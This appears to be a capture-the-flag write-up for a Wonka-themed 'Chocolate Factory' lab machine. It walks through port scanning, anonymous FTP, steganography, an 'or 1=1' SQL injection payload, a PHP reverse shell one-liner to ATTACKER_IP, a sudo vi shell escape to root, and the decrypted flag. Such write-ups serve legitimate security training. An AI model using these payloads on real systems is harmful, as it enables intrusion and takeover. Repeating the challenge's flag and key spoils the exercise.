# 🍫 Chocolate Factory CTF Write-Up 🏭


## 🌟 Executive Summary
Successfully penetrated a Wonka-themed Linux system through multiple vulnerabilities, ultimately gaining root access by combining web exploitation, steganography, and privilege escalation techniques.

```bash
                     _.-~-.
                   _' {} _-~
                 _~ ._ ~-._
               _~ -._~._.-~ -._
             _~ -._   __ _ .-~ ~.
           _~ .-~   ``  ``   ~-._~-._
         _~ -._                   ~ -~.
       _~_.-~                        ~-_
       ~ -._   Chocolate Factory       ~-.
             ~ -._                   _-~  `
                   ~ -._        _ -~
                       ~ -_ --~


🔍 Reconnaissance
🛠️ Tools Used

bash

🛡️ Nmap | 🕷️ Feroxbuster | 🔍 ffuf | 🖼️ Steghide | 🧰 LinPEAS

🎯 Attack Surface
Port	Service	Version	Findings
21	FTP	vsftpd 3.0.3	Anonymous login allowed, found gum_room.jpg
22	SSH	OpenSSH 7.6p1	Potential brute force target
80	HTTP	Apache 2.4.29	SQLi in login, command injection
100	Custom	?	Mysterious Wonka message

🔑 Key Discoveries
diff

+ Found hidden shadow file in gum_room.jpg via steghide
+ SQL injection vulnerability using 'or 1=1 -- 
+ Command injection in home.php

⚔️ Exploitation
🚪 Initial Access
python

# PHP Reverse Shell
php -r '$sock=fsockopen("ATTACKER_IP",7777);exec("sh <&3 >&3 2>&3");'

🧩 Stabilizing Shell
bash

# Magic shell stabilization sequence
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background with Ctrl+Z
stty raw -echo; fg

📈 Privilege Escalation Path

{
  "location": "/home/charlie/user.txt",
  "content": "flag{user_flag_here}"
}

🏴‍☠️ Root Flag

Decrypted using Python script:
python

from cryptography.fernet import Fernet
key = "-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY="
f = Fernet(key)
print(f.decrypt(b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'))

Final Prize: flag{cec59161d338fef787fcb4e296b42124}

📝 Lessons Learned

Category	Insight
Web Security	SQLi still works on modern systems
Steganography	Always check files for hidden data
Privilege Escalation	Sudo -l should be first command run
Cryptography	Found keys might be useful later

🧰 Full Command Cheatsheet
<details> <summary>Click to expand</summary>
bash

# Nmap scan
nmap -sV -sC -p- 10.10.109.203

# Web directory brute-forcing
feroxbuster -u http://10.10.109.203/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# Steganography extraction
steghide extract -sf gum_room.jpg

# Privilege escalation
sudo vi -c ':!/bin/sh' /dev/null
